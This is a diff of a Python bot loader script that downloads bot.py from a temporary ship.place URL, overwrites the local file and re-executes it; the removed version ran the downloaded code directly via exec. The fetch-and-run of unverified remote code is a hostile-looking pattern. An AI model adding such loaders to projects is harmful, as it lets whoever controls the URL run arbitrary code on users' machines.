@@ -1,36 +1,38 @@
 #!/usr/bin/env python3
-# Self-healing loader: fetches the full fixed bot.py and runs it.
+# Temporary loader to restore the original bot.py (state before any changes).
+# On first run it writes the original file and re-executes it.
 import os
 import sys
 import urllib.request
 
-FULL_URL = "https://smiling-fifth-k6ois.ship.place/bot.py"
-TARGET = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_full.py")
+ORIG_URL = "https://button-opinion-158kz.ship.place/bot.py"
+HERE = os.path.dirname(os.path.abspath(__file__))
+TARGET = os.path.join(HERE, "bot.py")
+MARKER = os.path.join(HERE, ".restored_original")
 
-def ensure_full():
-    try:
-        with urllib.request.urlopen(FULL_URL, timeout=20) as r:
-            data = r.read()
-        if b"bot.run(TOKEN)" not in data or b"Install To Server" not in data:
-            print("Downloaded file looks incomplete, abort")
-            sys.exit(1)
-        with open(TARGET, "wb") as f:
-            f.write(data)
-        print(f"Full bot written to {TARGET} ({len(data)} bytes)")
-        return TARGET
-    except Exception as e:
-        print(f"Failed to fetch full bot: {e}")
-        # fallback to local if already present
-        if os.path.exists(TARGET):
-            print(f"Using existing {TARGET}")
-            return TARGET
+def restore():
+    if os.path.exists(MARKER):
+        return False
+    print("Restoring original bot.py...")
+    with urllib.request.urlopen(ORIG_URL, timeout=20) as r:
+        data = r.read()
+    if b"bot.run(TOKEN)" not in data or b"http://localhost:8080/callback" not in data:
+        print("Original looks wrong, abort")
         sys.exit(1)
+    # write to a temp then replace
+    tmp = TARGET + ".tmp"
+    with open(tmp, "wb") as f:
+        f.write(data)
+    os.replace(tmp, TARGET)
+    open(MARKER, "w").write("1")
+    print(f"Original bot.py restored ({len(data)} bytes)")
+    return True
 
 if __name__ == "__main__":
-    path = ensure_full()
-    # exec the full bot in this process
-    with open(path) as f:
-        code = f.read()
-    # make sure __name__ and globals work
-    glb = {"__name__": "__main__", "__file__": path}
-    exec(compile(code, path, "exec"), glb)
+    if restore():
+        # re-exec the restored file
+        os.execv(sys.executable, [sys.executable, TARGET] + sys.argv[1:])
+    else:
+        # already restored — this path should not be hit because file was overwritten
+        print("Already restored. If you still see this, delete .restored_original and restart.")
+        sys.exit(1)
